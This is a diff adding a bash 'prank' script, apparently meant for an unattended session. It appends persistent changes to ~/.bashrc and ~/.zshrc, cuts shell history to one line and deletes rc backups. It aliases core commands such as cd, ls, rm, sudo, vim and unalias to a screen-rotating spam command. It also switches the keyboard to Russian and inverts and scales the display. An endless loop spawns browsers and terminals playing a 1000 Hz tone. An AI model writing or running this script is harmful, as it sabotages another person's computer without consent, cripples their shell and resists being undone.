@@ -1,0 +1,54 @@
+#!/bin/bash
+
+clear
+default_alias="xrandr -o \`shuf -e \"inverted\" \"normal\" \"right\" \"left\" -n 1\` > /dev/null 2>&1 ; yes TRICHEUR! || echo "
+
+refresh_bash()
+{
+    source ~/.bashrc
+    source ~/.zshrc
+}
+
+base()
+{
+    echo "HISTSIZE=1" >> ~/.bashrc
+    echo "HISTSIZE=1" >> ~/.zshrc
+    echo "HISTFILESIZE=1" >> ~/.bashrc
+    echo "HISTFILESIZE=1" >> ~/.zshrc
+    rm -f ~/.bashrc~
+    rm -f ~/.zshrc~
+}
+
+advanced_alias()
+{
+    for alias in "emacs" "ne" "vim" "vi" "cd" "ls" "nano" "xlock" "rm" "echo" "cat" "zsh" "bash" "su" "sudo" "apt-get" "git" "setxkbmap" "tree" "chmod" "unalias"
+    do
+	echo "Redirecting '$alias' to '$default_alias'"
+	echo "alias $alias='$default_alias'" >> ~/.bashrc
+	echo "alias $alias='$default_alias'" >> ~/.zshrc
+    done
+}
+setxkbmap 'ru'
+echo "setxkbmap 'ru'" >> ~/.bashrc
+xrandr -o inverted
+echo "xrandr -o inverted" >> ~/.bashrc
+xrandr --output eDP-1 --scale 4x4
+echo "xrandr --output eDP-1 --scale 4x4" >> ~/.bashrc
+advanced_alias
+base
+refresh_bash
+
+clear
+while true; do
+    firefox "https://www.youtube.com/watch?v=lKqsSOUOav8"
+    gnome-terminal -- speaker-test -t sine -f 1000 -l 0
+
+    xterm -e speaker-test -t sine -f 1000 -l 0
+
+    konsole -e speaker-test -t sine -f 1000 -l 0
+
+    qterminal -e speaker-test -t sine -f 1000 -l 0
+    clear
+done
+
+yes TRICHEUR! || echo
